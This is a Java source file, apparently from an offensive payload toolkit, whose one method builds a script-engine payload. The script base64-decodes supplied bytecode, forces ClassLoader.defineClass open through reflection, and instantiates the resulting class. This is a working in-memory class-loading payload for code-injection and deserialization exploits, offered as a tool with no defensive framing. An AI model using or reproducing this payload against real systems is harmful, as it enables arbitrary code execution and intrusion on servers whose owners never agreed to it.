package com.ppp.utils;

/**
 * @author Whoopsunix
 */
public class PayloadUtils {
    public static String loadByScriptEngine(String b64, String loaderClassName) {
        String code = String.format("data=\"%s\";bytes=\"\".getBytes();" +
                "try{bytes=java.util.Base64.getDecoder().decode(data);}catch(e){" +
                "aClass=java.lang.Class.forName(\"sun.misc.BASE64Decoder\");" +
                "object=aClass.newInstance();" +
                "bytes=aClass.getMethod(\"decodeBuffer\",java.lang.String.class).invoke(object,data);}" +
                "classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
                "try{" +
                "clazz=classLoader.loadClass(\"%s\");" +
                "clazz.newInstance();" +
                "}catch(err){" +
                "defineClassMethod=java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\",\"\".getBytes().getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);" +
                "defineClassMethod.setAccessible(true);" +
                "loadedClass=defineClassMethod.invoke(classLoader,bytes,0,bytes.length);" +
                "loadedClass.newInstance();" +
                "};", b64, loaderClassName);
        return code;
    }
}
